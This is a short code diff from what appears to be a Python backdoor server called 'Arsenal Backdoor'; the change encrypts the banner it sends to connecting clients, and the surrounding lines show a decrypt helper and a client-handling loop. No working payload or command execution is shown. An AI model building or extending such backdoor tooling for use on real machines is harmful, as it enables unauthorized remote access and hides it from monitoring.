@@ -28,7 +28,7 @@ def do_decrypt(ciphertext):
     return message
 
 def client(conn, addr, buff):
-    conn.send(b'Arsenal Backdoor\n')
+    conn.send(do_encrypt('Arsenal Backdoor'))
     while True:
         holder = []
         bs = conn.recv(8)
